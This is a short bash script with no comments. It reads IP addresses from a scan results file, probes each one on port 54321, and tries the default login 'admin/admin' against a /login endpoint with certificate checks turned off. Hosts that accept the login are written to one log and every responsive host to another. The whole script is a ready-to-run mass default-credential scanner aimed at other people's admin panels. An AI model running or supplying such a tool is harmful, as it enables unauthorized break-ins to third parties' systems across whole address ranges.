#!/bin/bash

for ip_ad in $(sed -nE 's/.*"ip": "([^"]+)".*/\1/p' /scan.json); do
    if curl --max-time 30 http://$ip_ad:54321 &>/dev/null; then
        res=$(curl "http://${ip_ad}:54321/login" --max-time 30 --data-raw 'username=admin&password=admin' --compressed --insecure 2>/dev/null)
        if [[ "$res" =~ .*true.* ]]; then
            echo $ip_ad >>/week.log
        fi
        echo $ip_ad >>/all.log
    fi
done
